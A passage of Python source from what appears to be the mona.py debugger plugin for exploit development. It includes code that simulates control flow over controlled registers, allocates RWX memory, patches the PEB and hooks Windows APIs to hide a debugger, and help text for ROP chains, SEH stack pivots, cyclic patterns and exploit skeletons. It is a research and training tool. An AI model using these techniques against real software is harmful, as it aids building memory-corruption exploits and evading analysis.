            maxinstr = 60
            maxcalllevel = 3
            callskip = 0
            instrcnt = 0
            regs = dbg.getRegs()
            aregs = getAllRegs()
            addy = regs['EIP']
            addyerror = False
            eaddy = 0
            showfuncposition = False
            if ('cl' in args):
                if (type(args['cl']).__name__.lower() != 'bool'):
                    try:
                        maxcalllevel = int(args['cl'])
                    except:
                        pass
            if ('cs' in args):
                if (type(args['cs']).__name__.lower() != 'bool'):
                    try:
                        callskip = int(args['cs'])
                    except:
                        pass
            if ('avoid' in args):
                if (type(args['avoid']).__name__.lower() != 'bool'):
                    try:
                        avoidl = args['avoid'].replace("'", '').replace('"', '').replace(' ', '').split(',')
                        for aa in avoidl:
                            (a, aok) = getAddyArg(aa)
                            if aok:
                                if (not (a in avoidlist)):
                                    avoidlist.append(a)
                    except:
                        pass
            if ('cr' in args):
                if (type(args['cr']).__name__.lower() != 'bool'):
                    crdata = args['cr']
                    crdata = crdata.replace("'", '').replace('"', '').replace(' ', '')
                    crlist = crdata.split(',')
                    for c in crlist:
                        c1 = c.upper()
                        if (c1 in aregs):
                            cregs.append(c1)
                            csmall = getSmallerRegs(c1)
                            for cs in csmall:
                                cregs.append(cs)
            if ('crc' in args):
                if (type(args['crc']).__name__.lower() != 'bool'):
                    crdata = args['crc']
                    crdata = crdata.replace("'", '').replace('"', '').replace(' ', '')
                    crlist = crdata.split(',')
                    for c in crlist:
                        c1 = c.upper()
                        if (c1 in aregs):
                            cregsc.append(c1)
                            csmall = getSmallerRegs(c1)
                            for cs in csmall:
                                cregsc.append(cs)
            cregs = list(set(cregs))
            cregsc = list(set(cregsc))
            if ('n' in args):
                if (type(args['n']).__name__.lower() != 'bool'):
                    try:
                        maxinstr = int(args['n'])
                    except:
                        pass
            if ('func' in args):
                showfuncposition = True
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (addy, addyok) = getAddyArg(args['a'])
                    if (not addyok):
                        dbg.log(' ** Please provide a valid start location with argument -a **')
                        return
            if ('e' in args):
                if (type(args['e']).__name__.lower() != 'bool'):
                    (eaddy, eaddyok) = getAddyArg(args['e'])
                    if (not eaddyok):
                        dbg.log(' ** Please provide a valid end location with argument -e **')
                        return
            dbg.log(('[+] Max nr of instructions per branch: %d' % maxinstr))
            dbg.log(('[+] Maximum CALL level: %d' % maxcalllevel))
            if (len(avoidlist) > 0):
                dbg.log("[+] Only showing flows that don't contains these pointer(s):")
                for a in avoidlist:
                    dbg.log(('    0x%08x' % a))
            if (callskip > 0):
                dbg.log(('[+] Skipping details of the first %d child functions' % callskip))
            if (eaddy > 0):
                dbg.log(('[+] Searching all possible paths between 0x%08x and 0x%08x' % (addy, eaddy)))
            else:
                dbg.log(('[+] Searching all possible paths from 0x%08x' % addy))
            if (len(cregs) > 0):
                dbg.log(('[+] Controlled registers: %s' % cregs))
            if (len(cregsc) > 0):
                dbg.log(('[+] Controlled register contents: %s' % cregsc))
            if (addy == regs['EIP']):
                cmd2run = 'k'
                srpdata = dbg.nativeCommand(cmd2run)
                for line in srpdata.split('\n'):
                    linedata = line.split(' ')
                    if (len(linedata) > 1):
                        childebp = linedata[0]
                        srp = linedata[1]
                        if (isAddress(childebp) and isAddress(srp)):
                            srplist.append(hexStrToInt(srp))
            branchstarts[addy] = [0, srplist, 0]
            curlocs = [addy]
            while (len(curlocs) > 0):
                curloc = curlocs.pop(0)
                callcnt = 0
                prevloc = curloc
                instrcnt = branchstarts[curloc][0]
                srplist = branchstarts[curloc][1]
                currcalllevel = branchstarts[curloc][2]
                while (instrcnt < maxinstr):
                    beforeloc = prevloc
                    prevloc = curloc
                    try:
                        thisopcode = dbg.disasm(curloc)
                        instruction = getDisasmInstruction(thisopcode)
                        instructionbytes = thisopcode.getBytes()
                        instructionsize = thisopcode.opsize
                        opupper = instruction.upper()
                        if opupper.startswith('RET'):
                            if (currcalllevel > 0):
                                currcalllevel -= 1
                            if (len(srplist) > 0):
                                newloc = srplist.pop(0)
                                rellist[curloc] = [newloc]
                                curloc = newloc
                            else:
                                break
                        elif opupper.startswith('JMP'):
                            if (('(' in opupper) and (')' in opupper)):
                                ipartsa = opupper.split(')')
                                ipartsb = ipartsa[0].split('(')
                                if (len(ipartsb) > 0):
                                    jmptarget = ipartsb[1]
                                    if isAddress(jmptarget):
                                        newloc = hexStrToInt(jmptarget)
                                        rellist[curloc] = [newloc]
                                        curloc = newloc
                        elif opupper.startswith('J'):
                            if (('(' in opupper) and (')' in opupper)):
                                ipartsa = opupper.split(')')
                                ipartsb = ipartsa[0].split('(')
                                if (len(ipartsb) > 0):
                                    jmptarget = ipartsb[1]
                                    if isAddress(jmptarget):
                                        newloc = hexStrToInt(jmptarget)
                                        if (not (newloc in curlocs)):
                                            curlocs.append(newloc)
                                        branchstarts[newloc] = [instrcnt, srplist, currcalllevel]
                                        newloc2 = (prevloc + instructionsize)
                                        rellist[curloc] = [newloc, newloc2]
                                        curloc = newloc2
                        elif opupper.startswith('CALL'):
                            if ((('(' in opupper) and (')' in opupper)) and (currcalllevel < maxcalllevel) and (callcnt > callskip)):
                                ipartsa = opupper.split(')')
                                ipartsb = ipartsa[0].split('(')
                                if (len(ipartsb) > 0):
                                    jmptarget = ipartsb[1]
                                    if isAddress(jmptarget):
                                        newloc = hexStrToInt(jmptarget)
                                        rellist[curloc] = [newloc]
                                        curloc = newloc
                                newretptr = (prevloc + instructionsize)
                                srplist.insert(0, newretptr)
                                currcalllevel += 1
                            else:
                                newloc = (curloc + instructionsize)
                                rellist[curloc] = [newloc]
                                curloc = newloc
                            callcnt += 1
                        else:
                            curloc += instructionsize
                            rellist[prevloc] = [curloc]
                    except:
                        if (not (beforeloc in endlist)):
                            endlist.append(beforeloc)
                        instrcnt = maxinstr
                        break
                    instrcnt += 1
                if (not (curloc in endlist)):
                    endlist.append(curloc)
            dbg.log(('[+] Found total of %d possible flows' % len(endlist)))
            if (eaddy > 0):
                if (eaddy in rellist):
                    endlist = [eaddy]
                    dbg.log(('[+] Limit flows to cases that contain 0x%08x' % eaddy))
                else:
                    dbg.log((' ** Unable to reach 0x%08x ** ' % eaddy))
                    dbg.log('    Try increasing max nr of instructions with parameter -n')
                    return
            filename = 'flows.txt'
            logfile = MnLog(filename)
            thislog = logfile.reset()
            dbg.log(('[+] Processing %d endings' % len(endlist)))
            endingcnt = 1
            processedresults = []
            for endaddy in endlist:
                dbg.log(('[+] Creating all paths between 0x%08x and 0x%08x' % (addy, endaddy)))
                allpaths = findAllPaths(rellist, addy, endaddy)
                if (len(allpaths) == 0):
                    continue
                dbg.log(('[+] Ending: 0x%08x (%d/%d), %d paths' % (endaddy, endingcnt, len(endlist), len(allpaths))))
                endingcnt += 1
                for p in allpaths:
                    if (p in processedresults):
                        dbg.log(('    > Skipping duplicate path from 0x%08x to 0x%08x' % (addy, endaddy)))
                    else:
                        processedresults.append(p)
                        skipthislist = False
                        logl = ('Path from 0x%08x to 0x%08x (%d instructions) :' % (addy, endaddy, len(p)))
                        if (len(avoidlist) > 0):
                            for a in avoidlist:
                                if (a in p):
                                    dbg.log(('    > Skipping path, contains 0x%08x (which should be avoided)' % a))
                                    skipthislist = True
                                    break
                        if (not skipthislist):
                            logfile.write('\n', thislog)
                            logfile.write(logl, thislog)
                            logfile.write(('-' * len(logl)), thislog)
                            dbg.log(('    > Simulating path from 0x%08x to 0x%08x (%d instructions)' % (addy, endaddy, len(p))))
                            cregsb = []
                            for c in cregs:
                                cregsb.append(c)
                            cregscb = []
                            for c in cregsc:
                                cregscb.append(c)
                            prevfname = ''
                            fname = ''
                            foffset = ''
                            previnstruction = ''
                            for thisaddy in p:
                                if showfuncposition:
                                    if ((previnstruction == '') or previnstruction.startswith('RET') or previnstruction.startswith('J') or previnstruction.startswith('CALL')):
                                        if (not (thisaddy in funcnamecache)):
                                            (fname, foffset) = getFunctionName(thisaddy)
                                            funcnamecache[thisaddy] = [fname, foffset]
                                        else:
                                            fname = funcnamecache[thisaddy][0]
                                            foffset = funcnamecache[thisaddy][1]
                                        if (fname != prevfname):
                                            prevfname = fname
                                            locname = fname
                                            if (foffset != ''):
                                                locname += ('+%s' % foffset)
                                            logfile.write(('#--- %s ---' % locname), thislog)
                                thisopcode = dbg.disasm(thisaddy)
                                instruction = getDisasmInstruction(thisopcode)
                                previnstruction = instruction
                                clist = []
                                clistc = []
                                for c in cregsb:
                                    combins = []
                                    combins.append((' %s' % c))
                                    combins.append(('[%s' % c))
                                    combins.append((',%s' % c))
                                    combins.append(('%s]' % c))
                                    combins.append(('%s-' % c))
                                    combins.append(('%s+' % c))
                                    combins.append(('-%s' % c))
                                    combins.append(('+%s' % c))
                                    for comb in combins:
                                        if ((comb in instruction) and (not (c in clist))):
                                            clist.append(c)
                                for c in cregscb:
                                    combins = []
                                    combins.append((' %s' % c))
                                    combins.append(('[%s' % c))
                                    combins.append((',%s' % c))
                                    combins.append(('%s]' % c))
                                    combins.append(('%s-' % c))
                                    combins.append(('%s+' % c))
                                    combins.append(('-%s' % c))
                                    combins.append(('+%s' % c))
                                    for comb in combins:
                                        if ((comb in instruction) and (not (c in clistc))):
                                            clistc.append(c)
                                (rsrc, rdst) = getSourceDest(instruction)
                                csource = False
                                cdest = False
                                if ((rsrc in cregsb) or (rsrc in cregscb)):
                                    csource = True
                                if ((rdst in cregsb) or (rdst in cregscb)):
                                    cdest = True
                                destructregs = ['MOV', 'XOR', 'OR']
                                writeregs = ['INC', 'DEC', 'AND']
                                ocregsb = copy.copy(cregsb)
                                if ((not instruction.startswith('TEST')) and (not instruction.startswith('CMP'))):
                                    for d in destructregs:
                                        if instruction.startswith(d):
                                            sourcefound = False
                                            sourcereg = ''
                                            destfound = False
                                            destreg = ''
                                            for s in clist:
                                                for sr in rsrc:
                                                    if ((s in sr) and (not sourcefound)):
                                                        sourcefound = True
                                                        sourcereg = s
                                                for sr in rdst:
                                                    if ((s in sr) and (not destfound)):
                                                        destfound = True
                                                        destreg = s
                                            if (sourcefound and destfound):
                                                if (not (destreg in cregsb)):
                                                    cregsb.append(destreg)
                                            if (destfound and (not sourcefound)):
                                                sregs = getSmallerRegs(destreg)
                                                if (destreg in cregsb):
                                                    cregsb.remove(destreg)
                                                for s in sregs:
                                                    if (s in cregsb):
                                                        cregsb.remove(s)
                                            break
                                logfile.write(('0x%08x : %s' % (thisaddy, instruction)), thislog)
            return

        def procChangeACL(args):
            size = 1
            addy = 0
            acl = ''
            addyerror = False
            aclerror = False
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (addy, addyok) = getAddyArg(args['a'])
                    if (not addyok):
                        addyerror = True
            if ('acl' in args):
                if (type(args['acl']).__name__.lower() != 'bool'):
                    if (args['acl'].upper() in memProtConstants):
                        acl = args['acl'].upper()
                    else:
                        aclerror = True
            else:
                aclerror = True
            if addyerror:
                dbg.log(' *** Please specify a valid address to argument -a ***')
            if aclerror:
                dbg.log(' *** Please specify a valid memory protection constant with -acl ***')
                dbg.log(' *** Valid values are :')
                for acltype in memProtConstants:
                    dbg.log(('     %s (%s = 0x%02x)' % (toSize(acltype, 10), memProtConstants[acltype][0], memProtConstants[acltype][1])))
            if ((not addyerror) and (not aclerror)):
                pageacl = memProtConstants[acl][1]
                pageaclname = memProtConstants[acl][0]
                dbg.log(('[+] Current ACL: %s' % getPointerAccess(addy)))
                dbg.log(('[+] Desired ACL: %s (0x%02x)' % (pageaclname, pageacl)))
                retval = dbg.rVirtualAlloc(addy, 1, 4096, pageacl)
            return

        def procToBp(args):
            '\n\t\t\tGenerate WinDBG syntax to create a logging breakpoint on a given location\n\t\t\t'
            addy = 0
            addyerror = False
            executenow = False
            locsyntax = ''
            regsyntax = ''
            poisyntax = ''
            dmpsyntax = ''
            instructionparts = []
            global silent
            oldsilent = silent
            regs = dbg.getRegs()
            silent = True
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (addy, addyok) = getAddyArg(args['a'])
                    if (not addyok):
                        addyerror = True
            else:
                addy = regs['EIP']
            if ('e' in args):
                executenow = True
            if addyerror:
                dbg.log(' *** Please provide a valid address with argument -a ***', highlight=1)
                return
            bpdest = ('0x%08x' % addy)
            instruction = ''
            ptrx = MnPointer(addy)
            modname = ptrx.belongsTo()
            if (not (modname == '')):
                mod = MnModule(modname)
                m = mod.moduleBase
                rva = (addy - m)
                bpdest = ('%s+0x%02x' % (modname, rva))
                thisopcode = dbg.disasm(addy)
                instruction = getDisasmInstruction(thisopcode)
            locsyntax = ('bp %s' % bpdest)
            instructionparts = multiSplit(instruction, [' ', ','])
            usedregs = []
            for reg in regs:
                for ipart in instructionparts:
                    if (reg.upper() in ipart.upper()):
                        usedregs.append(reg)
            if (len(usedregs) > 0):
                regsyntax = '.printf \\"'
                argsyntax = ''
                for ipart in instructionparts:
                    for reg in regs:
                        if (reg.upper() in ipart.upper()):
                            if ('[' in ipart):
                                regsyntax += ipart.replace('[', '').replace(']', '')
                                regsyntax += ': 0x%08x, '
                                argsyntax += ('%s,' % ipart.replace('[', '').replace(']', ''))
                                regsyntax += ipart
                                regsyntax += ': 0x%08x, '
                                argsyntax += ('%s,' % ipart.replace('[', 'poi(').replace(']', ')'))
                                iparttxt = ipart.replace('[', '').replace(']', '')
                                dmpsyntax += ('.echo;.echo %s:;dds %s L 0x24/4;' % (iparttxt, iparttxt))
                            else:
                                regsyntax += ipart
                                regsyntax += ': 0x%08x, '
                                argsyntax += ('%s,' % ipart)
                argsyntax = argsyntax.strip(',')
                regsyntax = regsyntax.strip(', ')
                regsyntax += ('\\",%s;' % argsyntax)
            if ('CALL' in instruction.upper()):
                dmpsyntax += '.echo;.printf \\"Stack (esp: 0x%08x):\\",esp;.echo;dds esp L 0x4;'
            if instruction.upper().startswith('RET'):
                dmpsyntax += '.echo;.printf \\"EAX: 0x%08x, Ret To: 0x%08x, Arg1: 0x%08x, Arg2: 0x%08x, Arg3: 0x%08x, Arg4: 0x%08x\\",eax,poi(esp),poi(esp+4),poi(esp+8),poi(esp+c),poi(esp+10);'
            bpsyntax = (((((locsyntax + ' ".echo ---------------;u eip L 1;') + regsyntax) + dmpsyntax) + '.echo;g') + '"')
            filename = 'logbps.txt'
            logfile = MnLog(filename)
            thislog = logfile.reset(False, False)
            with open(thislog, 'a') as fh:
                fh.write((bpsyntax + '\n'))
            silent = oldsilent
            dbg.log(('%s' % bpsyntax))
            dbg.log(('Updated %s' % thislog))
            if executenow:
                dbg.nativeCommand(bpsyntax)
                dbg.log(('> Breakpoint set at 0x%08x' % addy))
            return

        def procAllocMem(args):
            size = 4096
            addy = 0
            sizeerror = False
            addyerror = False
            byteerror = False
            fillup = False
            writemore = False
            fillbyte = 'A'
            acl = 'RWX'
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    sval = args['s']
                    if sval.lower().startswith('0x'):
                        try:
                            size = int(sval, 16)
                        except:
                            sizeerror = True
                    else:
                        try:
                            size = int(sval)
                        except:
                            sizeerror = True
                else:
                    sizeerror = True
            if ('b' in args):
                if (type(args['b']).__name__.lower() != 'bool'):
                    try:
                        fillbyte = hex2bin(args['b'])[0]
                    except:
                        dbg.log(' *** Invalid byte specified with -b ***')
                        byteerror = True
            if (size < 1):
                sizeerror = True
                dbg.log(' *** Minimum size is 0x1 bytes ***', highlight=1)
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (addy, addyok) = getAddyArg(args['a'])
                    if (not addyok):
                        addyerror = True
            if ('fill' in args):
                fillup = True
                if ('force' in args):
                    writemore = True
            aclerror = False
            if ('acl' in args):
                if (type(args['acl']).__name__.lower() != 'bool'):
                    if (args['acl'].upper() in memProtConstants):
                        acl = args['acl'].upper()
                    else:
                        aclerror = True
                        dbg.log(' *** Please specify a valid memory protection constant with -acl ***')
                        dbg.log(' *** Valid values are :')
                        for acltype in memProtConstants:
                            dbg.log(('     %s (%s = 0x%02x)' % (toSize(acltype, 10), memProtConstants[acltype][0], memProtConstants[acltype][1])))
            if addyerror:
                dbg.log(' *** Please specify a valid address with -a ***', highlight=1)
            if sizeerror:
                dbg.log(' *** Please specify a valid size with -s ***', highlight=1)
            if ((not addyerror) and (not sizeerror) and (not byteerror) and (not aclerror)):
                dbg.log(('[+] Requested allocation size: 0x%08x (%d) bytes' % (size, size)))
                if (addy > 0):
                    dbg.log(('[+] Desired target location : 0x%08x' % addy))
                pageacl = memProtConstants[acl][1]
                pageaclname = memProtConstants[acl][0]
                if (addy > 0):
                    dbg.log(('    Current page ACL: %s' % getPointerAccess(addy)))
                dbg.log(('    Desired page ACL: %s (0x%02x)' % (pageaclname, pageacl)))
                VIRTUAL_MEM = (4096 | 8192)
                allocat = dbg.rVirtualAlloc(addy, size, 4096, pageacl)
                if ((addy == 0) and (allocat > 0)):
                    retval = dbg.rVirtualProtect(allocat, 1, pageacl)
                else:
                    retval = dbg.rVirtualProtect(addy, 1, pageacl)
                dbg.log(('[+] Allocated memory at 0x%08x' % allocat))
                if ((allocat == 0) and fillup and (not writemore)):
                    dbg.log('[+] It looks like the page was already mapped. Use the -force argument')
                    dbg.log(('    to make me write to 0x%08x anyway' % addy))
                if (((allocat > 0) and fillup) or (writemore and fillup)):
                    loc = 0
                    written = 0
                    towrite = size
                    while (loc < towrite):
                        try:
                            dbg.writeMemory((addy + loc), fillbyte)
                            written += 1
                        except:
                            pass
                        loc += 1
                    dbg.log(('[+] Wrote %d times \\x%s to chunk at 0x%08x' % (written, bin2hex(fillbyte), addy)))
            return

        def procHideDebug(args):
            peb = dbg.getPEBAddress()
            dbg.log(('[+] Patching PEB (0x%08x)' % peb))
            if (peb == 0):
                dbg.log('** Unable to find PEB **')
                return
            isdebugged = struct.unpack('<B', dbg.readMemory((peb + 2), 1))[0]
            processheapflag = dbg.readLong((peb + 24))
            processheapflag += 16
            processheapvalue = dbg.readLong(processheapflag)
            ntglobalflag = dbg.readLong((peb + 104))
            dbg.log(('    Patching PEB.IsDebugged       : 0x%x -> 0x%x' % (isdebugged, 0)))
            dbg.writeMemory((peb + 2), '\x00')
            dbg.log(('    Patching PEB.ProcessHeap.Flag : 0x%x -> 0x%x' % (processheapvalue, 0)))
            dbg.writeLong(processheapflag, 0)
            dbg.log(('    Patching PEB.NtGlobalFlag     : 0x%x -> 0x%x' % (ntglobalflag, 0)))
            dbg.writeLong((peb + 104), 0)
            dbg.log('    Patching PEB.LDR_DATA Fill pattern')
            a = dbg.readLong((peb + 12))
            while (a != 0):
                a += 1
                try:
                    b = dbg.readLong(a)
                    c = dbg.readLong((a + 4))
                    if ((b == 4277075694) and (c == 4277075694)):
                        dbg.writeLong(a, 0)
                        dbg.writeLong((a + 4), 0)
                        a += 7
                except:
                    break
            uef = dbg.getAddress('kernel32.UnhandledExceptionFilter')
            if (uef > 0):
                dbg.log(('[+] Patching kernel32.UnhandledExceptionFilter (0x%08x)' % uef))
                uef += 134
                dbg.writeMemory(uef, dbg.assemble(' \t\t\t\t\tPUSH EDI \t\t\t\t'))
            else:
                dbg.log('[-] Failed to hook kernel32.UnhandledExceptionFilter (0x%08x)')
            remdebpres = dbg.getAddress('kernel32.CheckRemoteDebuggerPresent')
            if (remdebpres > 0):
                dbg.log(('[+] Patching CheckRemoteDebuggerPresent (0x%08x)' % remdebpres))
                dbg.writeMemory(remdebpres, dbg.assemble(' \t\t\t\t\tMOV   EDI, EDI                                    \n \t\t\t\t\tPUSH EBP                                         \n \t\t\t\t\tMOV  EBP, ESP                                    \n \t\t\t\t\tMOV   EAX, [EBP + C]                              \n \t\t\t\t\tPUSH  0                                           \n \t\t\t\t\tPOP   [EAX]                                       \n \t\t\t\t\tXOR   EAX, EAX                                    \n \t\t\t\t\tPOP   EBP                                         \n \t\t\t\t\tRET   8                                           \t\t\t\t'))
            else:
                dbg.log('[-] Unable to patch CheckRemoteDebuggerPresent')
            gtc = dbg.getAddress('kernel32.GetTickCount')
            if (gtc > 0):
                dbg.log(('[+] Patching GetTickCount (0x%08x)' % gtc))
                patch = ((dbg.assemble('MOV EDX, 0x7FFE0000') + Poly_ReturnDW(195948557)) + dbg.assemble('Ret'))
                while (len(patch) > 15):
                    patch = ((dbg.assemble('MOV EDX, 0x7FFE0000') + Poly_ReturnDW(195948557)) + dbg.assemble('Ret'))
                dbg.writeMemory(gtc, patch)
            else:
                dbg.log('[-] Unable to pach GetTickCount')
            zwq = dbg.getAddress('ntdll.ZwQuerySystemInformation')
            if (zwq > 0):
                dbg.log(('[+] Patching ZwQuerySystemInformation (0x%08x)' % zwq))
                isPatched = False
                a = 0
                s = 0
                while (a < 3):
                    a += 1
                    s += dbg.disasmSizeOnly((zwq + s)).opsize
                FakeCode = ((dbg.readMemory(zwq, 1) + 'xV4\x12') + dbg.readMemory((zwq + 5), 1))
                if (FakeCode == dbg.assemble('PUSH 0x12345678\nRET')):
                    isPatched = True
                    a = dbg.readLong((zwq + 1))
                    i = 0
                    s = 0
                    while (i < 3):
                        i += 1
                        s += dbg.disasmSizeOnly((a + s)).opsize
                if isPatched:
                    dbg.log('    Function was already patched.')
                else:
                    a = dbg.remoteVirtualAlloc(size=4096)
                    if (a > 0):
                        dbg.log(('    Writing instructions to 0x%08x' % a))
                        dbg.writeMemory(a, dbg.readMemory(zwq, s))
                        pushCode = dbg.assemble(('PUSH 0x%08x' % (zwq + s)))
                        patchCode = '\x83|$\x08\x07'
                        patchCode += 't\x06'
                        patchCode += pushCode
                        patchCode += 'Ã'
                        patchCode += '\x8bD$\x0c'
                        patchCode += 'j\x00'
                        patchCode += '\x8f\x00'
                        patchCode += '3À'
                        patchCode += 'Â\x14\x00'
                        dbg.writeMemory((a + s), patchCode)
                        dbg.writeMemory(zwq, dbg.assemble(('PUSH 0x%08X\nRET' % a)))
                    else:
                        dbg.log('    ** Unable to allocate memory in target process **')
            else:
                dbg.log('[-] Unable to patch ZwQuerySystemInformation')
            return
        sehUsage = 'Default module criteria : non safeseh, non aslr, non rebase\nThis function will retrieve all stackpivot pointers that will bring you back to nseh in a seh overwrite exploit\nOptional argument: \n    -all : also search outside of loaded modules'
        configUsage = 'Change config of mona.py\nAvailable options are : -get <parameter>, -set <parameter> <value> or -add <parameter> <value_to_add>\nValid parameters are : workingfolder, excluded_modules, author'
        jmpUsage = 'Default module criteria : non aslr, non rebase \nMandatory argument :  -r <reg>  where reg is a valid register'
        ropfuncUsage = 'Default module criteria : non aslr, non rebase, non os\nOutput will be written to ropfunc.txt'
        modulesUsage = 'Shows information about the loaded modules'
        ropUsage = 'Default module criteria : non aslr,non rebase,non os\nOptional parameters : \n    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)\n    -distance <value> : define the minimum distance for stackpivots (integer, default : 8).\n                        If you want to specify a min and max distance, set the value to min,max\n    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)\n    -split : write gadgets to individual files, grouped by the module the gadget belongs to\n    -fast : skip the \'non-interesting\' gadgets\n    -end <instruction(s)> : specify one or more instructions that will be used as chain end. \n                               (Separate instructions with #). Default ending is RETN\n    -f "file1,file2,..filen" : use mona generated rop files as input instead of searching in memory\n    -rva : use RVA\'s in rop chain\n    -s <technique> : only create a ROP chain for the selected technique (options: virtualalloc, virtualprotect)    \n    -sort : sort the output in rop.txt (sort on pointer value)'
        jopUsage = 'Default module criteria : non aslr,non rebase,non os\nOptional parameters : \n    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 8)'
        stackpivotUsage = 'Default module criteria : non aslr,non rebase,non os\nOptional parameters : \n    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)\n    -distance <value> : define the minimum distance for stackpivots (integer, default : 8)\n                        If you want to specify a min and max distance, set the value to min,max\n    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)'
        filecompareUsage = 'Compares 2 or more files created by mona using the same output commands\nMake sure to use files that are created with the same version of mona and \ncontain the output of the same mona command.\nMandatory argument : -f "file1,file2,...filen"\nPut all filenames between one set of double quotes, and separate files with comma\'s.\nYou can specify a foldername as well with -f, all files in the root of that folder will be part of the compare.\nOutput will be written to filecompare.txt and filecompare_not.txt (not matching pointers)\nOptional parameters : \n    -contains "INSTRUCTION"  (will only list if instruction is found)\n    -nostrict (will also list pointer is instructions don\'t match in all files)\n    -range <number> : find overlapping ranges for all pointers + range. \n                      When using -range, the -contains and -nostrict options will be ignored\n    -ptronly : only show matching pointers (slightly faster). Doesn\'t work when \'range\' is used'
        patcreateUsage = 'Create a cyclic pattern of a given size. Output will be written to pattern.txt\nin ascii, hex and unescape() javascript format\nMandatory argument : size (numberic value)\nOptional arguments :\n    -extended : extend the 3rd characterset (numbers) with punctuation marks etc\n    -c1 <chars> : set the first charset to this string of characters\n    -c2 <chars> : set the second charset to this string of characters\n    -c3 <chars> : set the third charset to this string of characters'
        patoffsetUsage = 'Find the location of 4 bytes in a cyclic pattern\nMandatory argument : the 4 bytes to look for\nNote :  you can also specify a register\nOptional arguments :\n    -extended : extend the 3rd characterset (numbers) with punctuation marks etc\n    -c1 <chars> : set the first charset to this string of characters\n    -c2 <chars> : set the second charset to this string of characters\n    -c3 <chars> : set the third charset to this string of characters\nNote : the charset must match the charset that was used to create the pattern !\n'
        findwildUsage = 'Find instructions in memory, accepts wildcards :\nMandatory arguments :\n        -s <instruction#instruction#instruction>  (separate instructions with #)\nOptional arguments :\n        -b <address> : base/bottom address of the search range\n        -t <address> : top address of the search range\n        -depth <nr>  : number of instructions to go deep\n        -all : show all instruction chains, even if it contains something that might break the chain\t\n        -distance min=nr,max=nr : you can use a numeric offset wildcard (a single *) in the first instruction of the search\n        the distance parameter allows you to specify the range of the offset\t\t\nInside the instructions string, you can use the following wildcards :\n        * = any instruction\n        r32 = any register\nExample : pop r32#*#xor eax,eax#*#pop esi#ret\n        '
        findUsage = "Find a sequence of bytes in memory.\nMandatory argument : -s <pattern> : the sequence to search for. If you specified type 'file', then use -s to specify the file.\nThis file needs to be a file created with mona.py, containing pointers at the begin of each line.\nOptional arguments:\n    -type <type>    : Type of pattern to search for : bin,asc,ptr,instr,file\n    -b <address> : base/bottom address of the search range\n    -t <address> : top address of the search range\n    -c : skip consecutive pointers but show length of the pattern instead\n    -p2p : show pointers to pointers to the pattern (might take a while !)\n           this setting equals setting -level to 1\n    -level <number> : do recursive (p2p) searches, specify number of levels deep\n                      if you want to look for pointers to pointers, set level to 1\n    -offset <number> : subtract a value from a pointer at a certain level\n    -offsetlevel <number> : level to subtract a value from a pointer\n    -r <number> : if p2p is used, you can tell the find to also find close pointers by specifying -r with a value.\n                  This value indicates the number of bytes to step backwards for each search\n    -unicode : used in conjunction with search type asc, this will convert the search pattern to unicode first \n    -ptronly : Only show the pointers, skip showing info about the pointer (slightly faster)"
        assembleUsage = 'Convert instructions to opcode. Separate multiple instructions with #.\nMandatory argument : -s <instructions> : the sequence of instructions to assemble to opcode'
        infoUsage = 'Show information about a given address in the context of the loaded application\nMandatory argument : -a <address> : the address to query'
        dumpUsage = 'Dump the specified memory range to a file. Either the end address or the size of\nbuffer needs to be specified.\nMandatory arguments :\n    -s <address> : start address\n    -f <filename> : the name of the file where to write the bytes\nOptional arguments:\n    -n <size> : the number of bytes to copy (size of the buffer)\n    -e <address> : the end address of the copy'
        compareUsage = "Compare a file created by mona's bytearray/msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory.\nMandatory argument :\n    -f <filename> : full path to input file\nOptional argument :\n    -a <address> : the exact address of the bytes in memory (address or register). \n                   If you don't specify an address, I will try to locate the bytes in memory \n                   by looking at the first 8 bytes.\n    -s : skip locations that belong to a module\n    -unicode : perform unicode search. Note: input should *not* be unicode, it will be expanded automatically\n\t-t : input file type format. If no file type format is specified, I will try to guess the input file type format.\n\t\t \n\t\t Available formats:\n\t\t'raw', 'hexdump', 'js-unicode', 'dword', 'xxd', 'byte-array', 'hexstring', 'hexdump-C', 'classic-hexdump', 'escaped-hexes', 'msfvenom-powershell', 'gdb', 'ollydbg', 'msfvenom-ruby', 'msfvenom-c', 'msfvenom-carray', 'msfvenom-python'\n\t"
        offsetUsage = 'Calculate the number of bytes between two addresses. You can use \nregisters instead of addresses. \nMandatory arguments :\n    -a1 <address> : the first address/register\n    -a2 <address> : the second address/register'
        bpUsage = 'Set a breakpoint when a given address is read from, written to or executed\nMandatory arguments :\n    -a <address> : the address where to set the breakpoint\n                   (absolute address / register / modulename!functionname)\n    -t <type> : type of the breakpoint, can be READ, WRITE or SFX'
        bfUsage = "Set a breakpoint on exported or imported function(s) of the selected modules. \nMandatory argument :\n    -t <type> : type of breakpoint action. Can be 'add', 'del' or 'list'\nOptional arguments :\n    -f <function type> : set to 'import' or 'export' to read IAT or EAT. Default : export\n    -s <func,func,func> : specify function names. \n                          If you want a bp on all functions, set -s to *"
        nosafesehUsage = 'Show modules that are not safeseh protected'
        nosafesehaslrUsage = "Show modules that are not safeseh protected, not subject to ASLR, and won't get rebased either"
        noaslrUsage = "Show modules that are not subject to ASLR and won't get rebased"
        findmspUsage = 'Finds begin of a cyclic pattern in memory, looks if one of the registers contains (is overwritten) with a cyclic pattern\nor points into a cyclic pattern. findmsp will also look if a SEH record is overwritten and finally, \nit will look for cyclic patterns on the stack, and pointers to cyclic pattern on the stack.\nOptional argument :\n    -distance <value> : distance from ESP, applies to search on the stack. Default : search entire stack\nNote : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use'
        suggestUsage = 'Suggests an exploit buffer structure based on pointers to a cyclic pattern\nNote : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use\nMandatory argument in case you are using WinDBG:\n    -t <type:arg> : skeletontype. Valid types are :\n                tcpclient:port, udpclient:port, fileformat:extension\n                Examples : -t tcpclient:21\n                           -t fileformat:pdf'
